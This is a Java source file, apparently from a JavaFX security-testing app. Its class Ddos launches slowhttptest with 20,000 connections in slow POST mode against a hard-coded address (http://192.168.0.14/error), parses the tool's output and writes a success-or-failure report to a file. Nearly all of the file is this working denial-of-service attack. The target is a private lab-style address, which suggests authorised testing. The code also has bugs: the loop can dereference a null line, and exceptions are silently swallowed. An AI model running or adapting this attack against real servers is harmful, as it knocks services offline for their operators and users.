package com.example.demo1;

import javafx.beans.binding.StringBinding;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;

public class Ddos {
    public static String ddos(Path t){
        String inf = "";
        Process p;
        String s, l = "Ddos\n";
        Integer i=0, y= 0,z =0,x=0,c=0,v=0,b=0,n=0,a=0,d=0,f=0,g=0;
        StringBuilder line;

        try {
            p = Runtime.getRuntime().exec(
                    "slowhttptest -c 20000 -H -g -o ./output_file -i 10 -r 200 -t POST -u http://192.168.0.14/error -x 24 -p 2"
            );
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(p.getInputStream()));

            while ((s = br.readLine()) != null || y==100000){
                if (s.contains("NO") ){
                    i++;
                    if (i<=1)
                        l+= "Ddos: Successfully\n";
                //System.out.println(s);
                }
                if (s.contains("test type:") ){
                    z++;
                    if (z<=1) {
                        //System.out.println(s);
                        line = new StringBuilder(s);
                        line.replace(0,7,"");
                        line.replace(10,17,"");
                        l += ":: " + line + "\n";
                    }
                }
                if (s.contains("number of") ){
                    x++;
                    if (x<=1) {
                        //System.out.println(s);
                        line = new StringBuilder(s);
                        line.replace(0, 7, "");
                        line.replace(22, 30, "");
                        l += ":: " + line + "\n";
                    }
                }
                if (s.contains("verb") ){
                    c++;
                    if (c<=1) {//System.out.println(s);
                        line = new StringBuilder(s);
                        line.replace(0, 7, "");
                        line.replace(5, 12, "");
                        l += ":: " + line + "\n";
                    }
                }
                if (s.contains("Content-Length") ){
                    v++;
                    if (v<=1){
                        //System.out.println(s);
                        line = new StringBuilder(s);
                        line.replace(0, 7, "");
                        line.replace(28, 37, "");
                        l += ":: " + line + "\n";
                    }
                }
                if (s.contains("follow up") ){
                    b++;
                    if (b<=1){
                        //System.out.println(s);
                        line = new StringBuilder(s);
                        line.replace(0, 7, "");
                        line.replace(24, 32, "");
                        l += ":: " + line + "\n";
                    }
                }
                if (s.contains("interval") ){
                    n++;
                    if (n<=1){
                        //System.out.println(s);
                        line = new StringBuilder(s);
                        line.replace(0, 7, "");
                        line.replace(32, 40, "");
                        l += ":: " + line + "\n";
                    }
                }
                if (s.contains("connections per seconds") ){
                    d++;
                    if (d<=1){
                        //System.out.println(s);
                        line = new StringBuilder(s);
                        line.replace(0, 7, "");
                        line.replace(24, 31, "");
                        l += ":: " + line + "\n";
                    }
                }
                if (s.contains("probe connection") ){
                    f++;
                    if (f<=1){
                        //System.out.println(s);
                        line = new StringBuilder(s);
                        line.replace(0, 7, "");
                        line.replace(25, 32, "");
                        l += ":: " + line + "\n";
                    }
                }
                if (s.contains("test duration") ){
                    g++;
                    if (g<=1){
                        //System.out.println(s);
                        line = new StringBuilder(s);
                        line.replace(0, 7, "");
                        line.replace(14, 21, "");
                        l += ":: " + line + "\n";
                    }
                }
                y++;
            }
            p.waitFor();
            if (i==0)
                l+="Ddos: Unsuccessfully";
            Files.write(t, l.getBytes());
            p.destroy();
        } catch (Exception e) {}

        return inf;
    }
}
